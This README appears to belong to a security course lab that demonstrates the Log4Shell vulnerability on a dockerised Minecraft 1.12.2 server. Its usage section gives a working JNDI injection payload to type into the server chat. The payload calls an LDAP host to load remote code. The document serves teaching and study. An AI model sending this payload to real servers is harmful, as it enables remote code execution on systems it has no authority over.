# cpts428-minecraft-log4j
Repository showcasing a log4j exploit on a Minecraft server

## Background

The included minecraft server is version 1.12.2 and is vulnerable to the "Log4Shell" attack.

## Usage

Start servers:
```
docker compose up
```

Run exploit (replace with your IP)
```
${jndi:ldap://10.217.191.180:1389/o=reference}
```
(put the above thing in the minecraft server chat)


## References

https://www.minecraft.net/en-us/article/important-message--security-vulnerability-java-edition
https://www.cisa.gov/news-events/news/apache-log4j-vulnerability-guidance
https://www.dynatrace.com/news/blog/what-is-log4shell/
https://bishopfox.com/blog/identify-and-exploit-log4shell
https://github.com/veracode-research/rogue-jndi
https://www.veracode.com/blog/research/exploiting-jndi-injections-java
https://github.com/HyCraftHD/Log4J-RCE-Proof-Of-Concept